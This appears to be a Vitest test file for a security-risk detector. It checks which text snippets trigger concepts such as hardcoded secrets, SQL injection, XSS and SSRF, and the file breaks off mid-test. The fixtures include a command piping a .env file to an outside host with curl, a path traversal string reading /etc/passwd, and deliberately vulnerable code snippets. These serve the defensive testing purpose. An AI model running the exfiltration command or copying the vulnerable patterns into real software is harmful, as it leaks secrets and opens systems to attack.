import { describe, it, expect } from "vitest";
import { detectRisks, riskLessonHint, SECURITY_CONCEPT_IDS } from "../src/risk";

// ---------------------------------------------------------------------------
// PART 1: detectRisks — positive detection cases
// ---------------------------------------------------------------------------

describe("detectRisks — hardcoded secret / api-key-in-code", () => {
  it("detects a hardcoded API key assigned in code", () => {
    const hits = detectRisks('const apiKey = "sk-1234567890abcdef";');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("hardcoded-secret");
  });

  it("detects AWS_SECRET_ACCESS_KEY literal in code", () => {
    const hits = detectRisks('AWS_SECRET_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("hardcoded-secret");
  });

  it("detects password literal assigned in code", () => {
    const hits = detectRisks('const password = "supersecret123"');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("hardcoded-secret");
  });
});

describe("detectRisks — secret-in-frontend", () => {
  it("detects NEXT_PUBLIC_ prefixed secret key", () => {
    const hits = detectRisks("NEXT_PUBLIC_STRIPE_SECRET=sk_live_abc123");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("secret-in-frontend");
  });

  it("detects VITE_ prefixed secret", () => {
    const hits = detectRisks("VITE_API_SECRET=my-secret-value");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("secret-in-frontend");
  });

  it("detects REACT_APP_ prefixed key", () => {
    const hits = detectRisks("REACT_APP_API_KEY=abc123xyz");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("secret-in-frontend");
  });
});

describe("detectRisks — missing-auth", () => {
  it("detects unprotected route comment", () => {
    const hits = detectRisks("// no authentication required on this route");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("missing-auth");
  });

  it("detects unauthenticated endpoint annotation", () => {
    const hits = detectRisks("this endpoint has no auth middleware");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("missing-auth");
  });
});

describe("detectRisks — missing-input-validation", () => {
  it("detects unsanitized user input (risk-framed true-positive)", () => {
    // The old matcher fired on "TODO: add input validation" (intent text, not risk) — dropped.
    // Keep the unambiguous risk-framed trigger instead.
    const hits = detectRisks("unsanitized user input passed directly to the database");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("missing-input-validation");
  });

  it("detects user input not sanitized remark", () => {
    const hits = detectRisks("user input is not sanitized before inserting into the database");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("missing-input-validation");
  });
});

describe("detectRisks — sql-injection-risk", () => {
  it("detects string concatenation in SQL query", () => {
    const hits = detectRisks('const q = "SELECT * FROM users WHERE id = " + userId');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("sql-injection-risk");
  });

  it("detects template literal SQL with variable interpolation", () => {
    const hits = detectRisks("db.query(`SELECT * FROM orders WHERE user = ${req.body.id}`)");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("sql-injection-risk");
  });
});

describe("detectRisks — env-file-exposed", () => {
  it("detects .env file being committed to git", () => {
    const hits = detectRisks("git add .env && git commit");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("env-file-exposed");
  });

  it("detects console.log of process.env secrets", () => {
    const hits = detectRisks("console.log(process.env.SECRET_KEY)");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("env-file-exposed");
  });

  it("detects .env file printed/exposed", () => {
    const hits = detectRisks("cat .env | curl -X POST https://example.com/log");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("env-file-exposed");
  });
});

describe("detectRisks — plaintext-http", () => {
  it("detects http:// used for API call", () => {
    const hits = detectRisks('fetch("http://api.example.com/users", options)');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("plaintext-http");
  });

  it("detects http:// endpoint in config", () => {
    const hits = detectRisks("API_URL=http://payments.example.com/charge");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("plaintext-http");
  });
});

describe("detectRisks — weak-password-storage", () => {
  it("detects storing password as plaintext", () => {
    const hits = detectRisks("store the password as plain text in the database");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("weak-password-storage");
  });

  it("detects md5 for password hashing", () => {
    const hits = detectRisks("hash the password using md5 before saving");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("weak-password-storage");
  });

  it("detects storing passwords without hashing", () => {
    const hits = detectRisks("save the user's password directly without hashing");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("weak-password-storage");
  });
});

describe("detectRisks — eval-injection", () => {
  it("detects eval( in code", () => {
    const hits = detectRisks("eval(userInput)");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("eval-injection");
  });

  it("detects dangerouslySetInnerHTML usage", () => {
    const hits = detectRisks('<div dangerouslySetInnerHTML={{ __html: content }} />');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("eval-injection");
  });

  it("detects new Function() with variable", () => {
    const hits = detectRisks("const fn = new Function(userCode)");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("eval-injection");
  });
});

describe("detectRisks — open-cors", () => {
  it("detects Access-Control-Allow-Origin: * header", () => {
    const hits = detectRisks('res.setHeader("Access-Control-Allow-Origin", "*")');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("open-cors");
  });

  it("detects cors({ origin: '*' }) config", () => {
    const hits = detectRisks("app.use(cors({ origin: '*' }))");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("open-cors");
  });
});

// ---------------------------------------------------------------------------
// PART 2: False-positive guards — benign text must NOT fire security concepts
// ---------------------------------------------------------------------------

describe("detectRisks — false-positive guards", () => {
  it("'I set an environment variable' does NOT fire env-file-exposed", () => {
    const hits = detectRisks("I set an environment variable for my project");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("env-file-exposed");
  });

  it("'http://localhost' does NOT flag plaintext-http as danger", () => {
    const hits = detectRisks("server running at http://localhost:3000");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("plaintext-http");
  });

  it("'http://127.0.0.1' does NOT flag plaintext-http", () => {
    const hits = detectRisks("connect to http://127.0.0.1:8080 for local testing");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("plaintext-http");
  });

  it("CORS documentation prose does NOT fire open-cors", () => {
    const hits = detectRisks("CORS allows cross-origin requests from trusted domains");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("open-cors");
  });

  it("reading a JWT without auth risk does NOT fire missing-auth", () => {
    const hits = detectRisks("decode the JWT to read the user's name");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("missing-auth");
  });

  it("discussing SQL queries generally does NOT fire sql-injection-risk", () => {
    const hits = detectRisks("run a SQL query to fetch records from the database");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("sql-injection-risk");
  });

  it("benign everyday text fires no security concepts at all", () => {
    const benign = [
      "the weather is nice today",
      "I went for a walk in the park",
      "let's deploy the app to production",
    ];
    for (const s of benign) {
      const hits = detectRisks(s);
      expect(hits).toHaveLength(0);
    }
  });
});

// ---------------------------------------------------------------------------
// PART 3: Severity ordering — danger before warn before info
// ---------------------------------------------------------------------------

describe("detectRisks — severity ordering", () => {
  it("sorts danger hits before warn hits", () => {
    // hardcoded-secret is danger; let's produce a mix by feeding text that hits both
    const text = [
      'const apiKey = "sk-live-abc123"',           // hardcoded-secret (danger)
      "no authentication required on this route",   // missing-auth (warn)
    ].join("\n");
    const hits = detectRisks(text);
    const dangerIdx = hits.findIndex((h) => h.severity === "danger");
    const warnIdx = hits.findIndex((h) => h.severity === "warn");
    if (dangerIdx !== -1 && warnIdx !== -1) {
      expect(dangerIdx).toBeLessThan(warnIdx);
    }
  });

  it("each hit has a severity field", () => {
    const hits = detectRisks('const secret = "sk_live_abc123"');
    expect(hits.length).toBeGreaterThan(0);
    for (const h of hits) {
      expect(["danger", "warn", "info"]).toContain(h.severity);
    }
  });
});

// ---------------------------------------------------------------------------
// PART 4: RiskHit shape
// ---------------------------------------------------------------------------

describe("detectRisks — RiskHit shape", () => {
  it("returns objects with conceptId, label, severity", () => {
    const hits = detectRisks('eval(userInput)');
    expect(hits.length).toBeGreaterThan(0);
    const h = hits[0];
    expect(typeof h.conceptId).toBe("string");
    expect(typeof h.label).toBe("string");
    expect(["danger", "warn", "info"]).toContain(h.severity);
  });

  it("deduplicates — same concept not returned twice", () => {
    const text = 'eval(x); eval(y); eval(z);';
    const hits = detectRisks(text);
    const ids = hits.map((h) => h.conceptId);
    const unique = new Set(ids);
    expect(ids.length).toBe(unique.size);
  });
});

// ---------------------------------------------------------------------------
// PART 5: riskLessonHint
// ---------------------------------------------------------------------------

describe("riskLessonHint", () => {
  it("returns a non-empty string for every security concept id", () => {
    for (const id of SECURITY_CONCEPT_IDS) {
      const hint = riskLessonHint(id);
      expect(typeof hint).toBe("string");
      expect(hint.length).toBeGreaterThan(10);
    }
  });

  it("returns a fallback string for an unknown id", () => {
    const hint = riskLessonHint("not-a-real-id");
    expect(typeof hint).toBe("string");
  });

  it("hints mention 'risk' or 'safe' or 'fix' or 'never' in plain English", () => {
    // The hint should be a framing string a lesson generator can prepend
    for (const id of SECURITY_CONCEPT_IDS) {
      const hint = riskLessonHint(id).toLowerCase();
      const hasSafetyWord = /risk|safe|fix|never|avoid|danger|protect|instead|should/.test(hint);
      expect(hasSafetyWord, `hint for ${id} lacks safety framing`).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// PART 5b: FIX 2 regression — tightened matchers (false-positive guards + true-positive checks)
// ---------------------------------------------------------------------------

describe("detectRisks — FIX 2: sql-injection-risk false-positive guards", () => {
  it("benign update announcement does NOT fire sql-injection-risk", () => {
    const hits = detectRisks("UPDATE: we shipped 3 + 1 new features.");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("sql-injection-risk");
  });

  it("SELECT instruction prose does NOT fire sql-injection-risk", () => {
    const hits = detectRisks("SELECT the option you want and click + to add another row.");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("sql-injection-risk");
  });

  it("string concat SQL query still fires sql-injection-risk (true-positive)", () => {
    const hits = detectRisks('const q = "SELECT * FROM users WHERE id = " + userId');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("sql-injection-risk");
  });

  it("template literal SQL interpolation still fires sql-injection-risk (true-positive)", () => {
    const hits = detectRisks("db.query(`SELECT * FROM users WHERE name = ${name}`)");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("sql-injection-risk");
  });
});

describe("detectRisks — FIX 2: missing-input-validation false-positive guards", () => {
  it("'add input validation to signup form' intent text does NOT fire missing-input-validation", () => {
    const hits = detectRisks("We need to add input validation to the signup form.");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("missing-input-validation");
  });

  it("'no validation step in this recipe' does NOT fire missing-input-validation", () => {
    const hits = detectRisks("There is no validation step in this recipe.");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("missing-input-validation");
  });

  it("'user input is not sanitized' still fires missing-input-validation (true-positive)", () => {
    const hits = detectRisks("user input is not sanitized before inserting into the database");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("missing-input-validation");
  });

  it("'unvalidated user input' still fires missing-input-validation (true-positive)", () => {
    const hits = detectRisks("unvalidated user input passed to the query");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("missing-input-validation");
  });
});

describe("detectRisks — FIX 2: eval-injection false-positive guards", () => {
  it("'eval (assess) the candidates' prose does NOT fire eval-injection", () => {
    const hits = detectRisks("We will eval (assess) the candidates next week.");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).not.toContain("eval-injection");
  });

  it("eval(userInput) still fires eval-injection (true-positive)", () => {
    const hits = detectRisks("eval(userInput)");
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("eval-injection");
  });

  it("dangerouslySetInnerHTML still fires eval-injection (true-positive)", () => {
    const hits = detectRisks('<div dangerouslySetInnerHTML={{ __html: content }} />');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("eval-injection");
  });

  it("setTimeout with string still fires eval-injection (true-positive)", () => {
    const hits = detectRisks('setTimeout("code()", 100)');
    const ids = hits.map((h) => h.conceptId);
    expect(ids).toContain("eval-injection");
  });
});

// ---------------------------------------------------------------------------
// PART 6: Every security concept has matchers + severity in the registry
// ---------------------------------------------------------------------------

describe("SECURITY_CONCEPT_IDS completeness", () => {
  it("has exactly 28 security concept ids (21 original + 7 new)", () => {
    expect(SECURITY_CONCEPT_IDS).toHaveLength(28);
  });

  it("all security concept ids are unique", () => {
    expect(new Set(SECURITY_CONCEPT_IDS).size).toBe(SECURITY_CONCEPT_IDS.length);
  });

  it("detectRisks returns a hit for a canonical trigger for each security concept", () => {
    const canonicalTriggers: Record<string, string> = {
      // original 10
      "hardcoded-secret":           'const apiKey = "sk-live-abc"',
      "secret-in-frontend":         "NEXT_PUBLIC_SECRET=abc123",
      "missing-auth":               "no authentication required on this route",
      "missing-input-validation":   "user input is not sanitized",
      "sql-injection-risk":         'query = "SELECT * FROM t WHERE id = " + id',
      "env-file-exposed":           "git add .env",
      "plaintext-http":             'fetch("http://api.example.com/data")',
      "weak-password-storage":      "store password as plain text",
      "eval-injection":             "eval(userInput)",
      "open-cors":                  "Access-Control-Allow-Origin: *",
      // new 11
      "xss":                        "cross-site scripting vulnerability in the output",
      "csrf":                       "no CSRF token on the form submission",
      "path-traversal":             "path traversal attack via the filename parameter",
      "ssrf":                       "this endpoint is vulnerable to SSRF attacks",
      "idor":                       "IDOR vulnerability: no ownership check on the record",
      "insecure-deserialization":   "insecure deserialization of user-supplied data",
      "missing-rate-limit":         "the login endpoint has no rate limiting",
      "default-credentials":        "still using the default password for the database",
      "sensitive-data-in-logs":     "logging the auth token to the server logs",
      "mass-assignment":            "mass assignment vulnerability allows overwriting isAdmin",
      "debug-mode-in-prod":         "DEBUG=True in production exposes stack traces to users",
      // new 7 (v1.7)
      "open-redirect":              "open redirect vulnerability via unvalidated returnUrl param",
      "jwt-alg-none":               'JWT with alg:"none" bypasses signature verification',
      "insecure-cookie":            "auth cookie is set without the httpOnly flag",
      "verbose-error-exposed":      "verbose error message exposes the database path to clients",
      "cleartext-token-storage":    "storing the JWT in localStorage makes it accessible to XSS",
      "directory-listing":          "directory listing is enabled on the web server exposing all files",
      "ssti":                       "server-side template injection via the name parameter",
    };
    for (const [id, trigger] of Object.entries(canonicalTriggers)) {
      const ids = detectRisks(trigger).map((h) => h.conceptId);
      expect(ids, `canonical trigger for ${id} did not fire`).toContain(id);
    }
  });
});

// ---------------------------------------------------------------------------
// PART 7: New security concepts — true-positive + false-positive detection
// ---------------------------------------------------------------------------

describe("detectRisks — xss", () => {
  it("detects cross-site scripting mention", () => {
    const hits = detectRisks("cross-site scripting vulnerability in the HTML output");
    expect(hits.map((h) => h.conceptId)).toContain("xss");
  });

  it("detects innerHTML assigned with variable", () => {
    const hits = detectRisks("element.innerHTML = userInput");
    expect(hits.map((h) => h.conceptId)).toContain("xss");
  });

  it("FALSE-POSITIVE: 'script runs on page load' does NOT fire xss", () => {
    const hits = detectRisks("the script runs on page load");
    expect(hits.map((h) => h.conceptId)).not.toContain("xss");
  });
});

describe("detectRisks — csrf", () => {
  it("detects no CSRF token mention", () => {
    const hits = detectRisks("no CSRF token on the form submission");
    expect(hits.map((h) => h.conceptId)).toContain("csrf");
  });

  it("detects cross-site request forgery mention", () => {
    const hits = detectRisks("cross-site request forgery protection is missing");
    expect(hits.map((h) => h.conceptId)).toContain("csrf");
  });

  it("FALSE-POSITIVE: 'configure CORS on API' does NOT fire csrf", () => {
    const hits = detectRisks("configure CORS on the API server");
    expect(hits.map((h) => h.conceptId)).not.toContain("csrf");
  });
});

describe("detectRisks — path-traversal", () => {
  it("detects path traversal in description", () => {
    const hits = detectRisks("attacker uses path traversal to read /etc/passwd");
    expect(hits.map((h) => h.conceptId)).toContain("path-traversal");
  });

  it("detects ../ in filename string", () => {
    const hits = detectRisks("filename = '../../../etc/passwd'");
    expect(hits.map((h) => h.conceptId)).toContain("path-traversal");
  });

  it("FALSE-POSITIVE: 'use relative path' does NOT fire path-traversal", () => {
    const hits = detectRisks("use a relative path to the config file");
    expect(hits.map((h) => h.conceptId)).not.toContain("path-traversal");
  });
});

describe("detectRisks — ssrf", () => {
  it("detects SSRF mention", () => {
    const hits = detectRisks("this endpoint is vulnerable to SSRF attacks");
    expect(hits.map((h) => h.conceptId)).toContain("ssrf");
  });

  it("detects server-side request forgery mention", () => {
    const hits = detectRisks("server-side request forgery via the URL parameter");
    expect(hits.map((h) => h.conceptId)).toContain("ssrf");
  });

  it("FALSE-POSITIVE: 'server sends a request to the API' does NOT fire ssrf", () => {
    const hits = detectRisks("the server sends a request to the external API");
    expect(hits.map((h) => h.conceptId)).not.toContain("ssrf");
  });
});

describe("detectRisks — idor", () => {
  it("detects IDOR mention", () => {
    const hits = detectRisks("IDOR vulnerability: no ownership check before returning record");
    expect(hits.map((h) => h.conceptId)).toContain("idor");
  });

  it("detects insecure direct object reference", () => {
    const hits = detectRisks("insecure direct object reference allows reading other users data");
    expect(hits.map((h) => h.conceptId)).toContain("idor");
  });

  it("FALSE-POSITIVE: 'fetch document by ID' does NOT fire idor", () => {
    const hits = detectRisks("fetch the document by its ID from the database");
    expect(hits.map((h) => h.conceptId)).not.toContain("idor");
  });
});

describe("detectRisks — insecure-deserialization", () => {
  it("detects insecure deserialization mention", () => {
    const hits = detectRisks("insecure deserialization of user-supplied data");
    expect(hits.map((h) => h.conceptId)).toContain("insecure-deserialization");
  });

  it("detects pickle.loads on user data", () => {
    const hits = detectRisks("pickle.loads(user_data) in the handler");
    expect(hits.map((h) => h.conceptId)).toContain("insecure-deserialization");
  });

  it("FALSE-POSITIVE: 'JSON.parse the response' does NOT fire insecure-deserialization", () => {
    const hits = detectRisks("JSON.parse the API response to get the user object");
    expect(hits.map((h) => h.conceptId)).not.toContain("insecure-deserialization");
  });
});

describe("detectRisks — missing-rate-limit", () => {
  it("detects no rate limiting on login endpoint", () => {
    const hits = detectRisks("the login endpoint has no rate limiting");
    expect(hits.map((h) => h.conceptId)).toContain("missing-rate-limit");
  });

  it("detects missing rate limit annotation", () => {
    const hits = detectRisks("missing rate limit on the /api/send-email route");
    expect(hits.map((h) => h.conceptId)).toContain("missing-rate-limit");
  });

  it("FALSE-POSITIVE: 'rate limiting protects the API' does NOT fire missing-rate-limit", () => {
    const hits = detectRisks("rate limiting can help protect your API from abuse");
    expect(hits.map((h) => h.conceptId)).not.toContain("missing-rate-limit");
  });
});

describe("detectRisks — default-credentials", () => {
  it("detects default password never changed", () => {
    const hits = detectRisks("still using the default password for the database");
    expect(hits.map((h) => h.conceptId)).toContain("default-credentials");
  });

  it("detects admin/admin login pattern", () => {
    const hits = detectRisks("login with admin/admin — default credentials were never changed");
    expect(hits.map((h) => h.conceptId)).toContain("default-credentials");
  });

  it("FALSE-POSITIVE: 'open admin panel' does NOT fire default-credentials", () => {
    const hits = detectRisks("open the admin panel to see the overview dashboard");
    expect(hits.map((h) => h.conceptId)).not.toContain("default-credentials");
  });
});

describe("detectRisks — sensitive-data-in-logs", () => {
  it("detects logging auth token", () => {
    const hits = detectRisks("logging the auth token to the server logs");
    expect(hits.map((h) => h.conceptId)).toContain("sensitive-data-in-logs");
  });

  it("detects console.log of password", () => {
    const hits = detectRisks("console.log(password) in the authentication handler");
    expect(hits.map((h) => h.conceptId)).toContain("sensitive-data-in-logs");
  });

  it("FALSE-POSITIVE: 'view the server logs' does NOT fire sensitive-data-in-logs", () => {
    const hits = detectRisks("view the server logs to diagnose the issue");
    expect(hits.map((h) => h.conceptId)).not.toContain("sensitive-data-in-logs");
  });
});

describe("detectRisks — mass-assignment", () => {
  it("detects mass assignment vulnerability", () => {
    const hits = detectRisks("mass assignment vulnerability allows overwriting isAdmin field");
    expect(hits.map((h) => h.conceptId)).toContain("mass-assignment");
  });

  it("detects ...req.body spread into create call", () => {
    const hits = detectRisks("User.create({ ...req.body }) allows mass assignment of any field");
    expect(hits.map((h) => h.conceptId)).toContain("mass-assignment");
  });

  it("FALSE-POSITIVE: 'bulk assign tasks to team' does NOT fire mass-assignment", () => {
    const hits = detectRisks("bulk assign tasks to team members in the project");
    expect(hits.map((h) => h.conceptId)).not.toContain("mass-assignment");
  });
});

describe("detectRisks — debug-mode-in-prod", () => {
  it("detects DEBUG=True in production", () => {
    const hits = detectRisks("DEBUG=True in production exposes stack traces to users");
    expect(hits.map((h) => h.conceptId)).toContain("debug-mode-in-prod");
  });

  it("detects stack traces exposed in production", () => {
    const hits = detectRisks("stack traces are exposed to end users in the production environment");
    expect(hits.map((h) => h.conceptId)).toContain("debug-mode-in-prod");
  });

  it("FALSE-POSITIVE: 'enable debug logging locally' does NOT fire debug-mode-in-prod", () => {
    const hits = detectRisks("enable debug logging locally to trace the issue");
    expect(hits.map((h) => h.conceptId)).not.toContain("debug-mode-in-prod");
  });

  it("FALSE-POSITIVE: 'check stack trace in development' does NOT fire debug-mode-in-prod", () => {
    const hits = detectRisks("check the stack trace in development to find the bug");
    expect(hits.map((h) => h.conceptId)).not.toContain("debug-mode-in-prod");
  });
});

describe("riskLessonHint — new security concepts have hints", () => {
  const newSecurityIds = [
    "xss", "csrf", "path-traversal", "ssrf", "idor",
    "insecure-deserialization", "missing-rate-limit", "default-credentials",
    "sensitive-data-in-logs", "mass-assignment", "debug-mode-in-prod",
  ];
  it("returns a non-empty, safety-framed hint for each new security concept", () => {
    for (const id of newSecurityIds) {
      const hint = riskLessonHint(id).toLowerCase();
      expect(hint.length, `${id} hint is empty`).toBeGreaterThan(10);
      const hasSafetyWord = /risk|safe|fix|never|avoid|danger|protect|instead|should/.test(hint);
      expect(hasSafetyWord, `${id} hint lacks safety framing`).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// PART A (new) — 7 additional security concepts
// ---------------------------------------------------------------------------

describe("detectRisks — open-redirect", () => {
  it("detects 'open redirect' terminology", () => {
    const hits = detectRisks("the endpoint has an open redirect vulnerability via the returnUrl param");
    expect(hits.map((h) => h.conceptId)).toContain("open-redirect");
  });

  it("detects redirect to unvalidated user-supplied URL", () => {
    const hits = detectRisks("redirect to the unvalidated user-supplied URL without checking");
    expect(hits.map((h) => h.conceptId)).toContain("open-redirect");
  });

  it("detects res.redirect with user input", () => {
    const hits = detectRisks("res.redirect(req.query.next) — redirecting to user-controlled URL");
    expect(hits.map((h) => h.conceptId)).toContain("open-redirect");
  });

  it("FALSE-POSITIVE: 'redirect the user to the dashboard after login' does NOT fire open-redirect", () => {
    const hits = detectRisks("redirect the user to the dashboard after login");
    expect(hits.map((h) => h.conceptId)).not.toContain("open-redirect");
  });

  it("FALSE-POSITIVE: 'add a redirect from /old to /new' does NOT fire open-redirect", () => {
    const hits = detectRisks("add a redirect from /old to /new in the routes config");
    expect(hits.map((h) => h.conceptId)).not.toContain("open-redirect");
  });
});

describe("detectRisks — jwt-alg-none", () => {
  it("detects JWT algorithm none attack", () => {
    const hits = detectRisks('JWT with alg:"none" bypasses signature verification');
    expect(hits.map((h) => h.conceptId)).toContain("jwt-alg-none");
  });

  it("detects algorithm: none in JWT header", () => {
    const hits = detectRisks('the JWT header has {"alg":"none"} which disables signing');
    expect(hits.map((h) => h.conceptId)).toContain("jwt-alg-none");
  });

  it("detects JWT signature not verified", () => {
    const hits = detectRisks("the server accepts JWTs without verifying the signature");
    expect(hits.map((h) => h.conceptId)).toContain("jwt-alg-none");
  });

  it("FALSE-POSITIVE: 'decode a JWT to read claims' does NOT fire jwt-alg-none", () => {
    const hits = detectRisks("decode a JWT to read the user claims from the payload");
    expect(hits.map((h) => h.conceptId)).not.toContain("jwt-alg-none");
  });

  it("FALSE-POSITIVE: 'sign the JWT with HS256' does NOT fire jwt-alg-none", () => {
    const hits = detectRisks("sign the JWT with HS256 using the secret key");
    expect(hits.map((h) => h.conceptId)).not.toContain("jwt-alg-none");
  });
});

describe("detectRisks — insecure-cookie", () => {
  it("detects auth cookie without httpOnly", () => {
    const hits = detectRisks("auth cookie is set without the httpOnly flag");
    expect(hits.map((h) => h.conceptId)).toContain("insecure-cookie");
  });

  it("detects session cookie missing Secure attribute", () => {
    const hits = detectRisks("session cookie is missing the Secure attribute so it travels over HTTP");
    expect(hits.map((h) => h.conceptId)).toContain("insecure-cookie");
  });

  it("detects cookie without sameSite", () => {
    const hits = detectRisks("the cookie has no sameSite attribute making it vulnerable to CSRF");
    expect(hits.map((h) => h.conceptId)).toContain("insecure-cookie");
  });

  it("FALSE-POSITIVE: 'set a cookie for the user session' does NOT fire insecure-cookie", () => {
    const hits = detectRisks("set a cookie for the user session on login");
    expect(hits.map((h) => h.conceptId)).not.toContain("insecure-cookie");
  });

  it("FALSE-POSITIVE: 'accept cookies policy banner' does NOT fire insecure-cookie", () => {
    const hits = detectRisks("show the accept cookies policy banner to new visitors");
    expect(hits.map((h) => h.conceptId)).not.toContain("insecure-cookie");
  });
});

describe("detectRisks — verbose-error-exposed", () => {
  it("detects stack trace returned to the user", () => {
    const hits = detectRisks("the API returns the full stack trace to the user on error");
    expect(hits.map((h) => h.conceptId)).toContain("verbose-error-exposed");
  });

  it("detects internal error message shown in response", () => {
    const hits = detectRisks("the server sends internal error details back in the HTTP response body");
    expect(hits.map((h) => h.conceptId)).toContain("verbose-error-exposed");
  });

  it("detects error message leaking database path", () => {
    const hits = detectRisks("verbose error message exposes the database connection string to clients");
    expect(hits.map((h) => h.conceptId)).toContain("verbose-error-exposed");
  });

  it("FALSE-POSITIVE: 'handle errors gracefully' does NOT fire verbose-error-exposed", () => {
    const hits = detectRisks("handle errors gracefully and show a friendly message to users");
    expect(hits.map((h) => h.conceptId)).not.toContain("verbose-error-exposed");
  });

  it("FALSE-POSITIVE: 'log the error on the server' does NOT fire verbose-error-exposed", () => {
    const hits = detectRisks("log the error on the server side for debugging");
    expect(hits.map((h) => h.conceptId)).not.toContain("verbose-error-exposed");
  });
});

describe("detectRisks — cleartext-token-storage", () => {
  it("detects auth token stored in localStorage", () => {
    const hits = detectRisks("localStorage.setItem('authToken', token) stores the token in plaintext");
    expect(hits.map((h) => h.conceptId)).toContain("cleartext-token-storage");
  });

  it("detects JWT stored in localStorage", () => {
    const hits = detectRisks("storing the JWT in localStorage makes it accessible to XSS attacks");
    expect(hits.map((h) => h.conceptId)).toContain("cleartext-token-storage");
  });

  it("detects access token written to localStorage", () => {
    const hits = detectRisks("save the access token to localStorage for later use");
    expect(hits.map((h) => h.conceptId)).toContain("cleartext-token-storage");
  });

  it("FALSE-POSITIVE: 'store user preferences in localStorage' does NOT fire cleartext-token-storage", () => {
    const hits = detectRisks("store user preferences like theme and language in localStorage");
    expect(hits.map((h) => h.conceptId)).not.toContain("cleartext-token-storage");
  });

  it("FALSE-POSITIVE: 'use sessionStorage for temporary data' does NOT fire cleartext-token-storage", () => {
    const hits = detectRisks("use sessionStorage for temporary UI state that resets on tab close");
    expect(hits.map((h) => h.conceptId)).not.toContain("cleartext-token-storage");
  });
});

describe("detectRisks — directory-listing", () => {
  it("detects directory listing enabled on server", () => {
    const hits = detectRisks("directory listing is enabled on the web server exposing all files");
    expect(hits.map((h) => h.conceptId)).toContain("directory-listing");
  });

  it("detects autoindex enabled in nginx", () => {
    const hits = detectRisks("autoindex on in nginx config allows directory listing of uploads folder");
    expect(hits.map((h) => h.conceptId)).toContain("directory-listing");
  });

  it("detects directory browsing enabled", () => {
    const hits = detectRisks("directory browsing is enabled, letting attackers enumerate all files");
    expect(hits.map((h) => h.conceptId)).toContain("directory-listing");
  });

  it("FALSE-POSITIVE: 'list the files in a directory' does NOT fire directory-listing", () => {
    const hits = detectRisks("list the files in a directory using the ls command");
    expect(hits.map((h) => h.conceptId)).not.toContain("directory-listing");
  });

  it("FALSE-POSITIVE: 'show a listing of products' does NOT fire directory-listing", () => {
    const hits = detectRisks("show a listing of products on the homepage");
    expect(hits.map((h) => h.conceptId)).not.toContain("directory-listing");
  });
});

describe("detectRisks — ssti", () => {
  it("detects server-side template injection mention", () => {
    const hits = detectRisks("server-side template injection via the name parameter");
    expect(hits.map((h) => h.conceptId)).toContain("ssti");
  });

  it("detects SSTI abbreviation", () => {
    const hits = detectRisks("the endpoint is vulnerable to SSTI attacks through the template engine");
    expect(hits.map((h) => h.conceptId)).toContain("ssti");
  });

  it("detects user input rendered in template", () => {
    const hits = detectRisks("user input is passed directly into the Jinja2 template without sanitization");
    expect(hits.map((h) => h.conceptId)).toContain("ssti");
  });

  it("FALSE-POSITIVE: 'use a template for the email layout' does NOT fire ssti", () => {
    const hits = detectRisks("use a template for the email layout");
    expect(hits.map((h) => h.conceptId)).not.toContain("ssti");
  });

  it("FALSE-POSITIVE: 'render the HTML template with static data' does NOT fire ssti", () => {
    const hits = detectRisks("render the HTML template with static data from the config file");
    expect(hits.map((h) => h.conceptId)).not.toContain("ssti");
  });
});

// ---------------------------------------------------------------------------
// PART B (new) — false-positive fixes
// ---------------------------------------------------------------------------

describe("detectRisks — PART B FIX: sensitive-data-in-logs false-positive guards", () => {
  it("FALSE-POSITIVE: journaling prose 'I need to log my password to the diary' does NOT fire", () => {
    const hits = detectRisks("I need to log my password to the diary so I don't forget it");
    expect(hits.map((h) => h.conceptId)).not.toContain("sensitive-data-in-logs");
  });

  it("FALSE-POSITIVE: 'Logging sensitive information about feelings' does NOT fire", () => {
    const hits = detectRisks("Logging sensitive information about my feelings in a journal");
    expect(hits.map((h) => h.conceptId)).not.toContain("sensitive-data-in-logs");
  });

  it("TRUE-POSITIVE: 'console.log(password)' still fires sensitive-data-in-logs", () => {
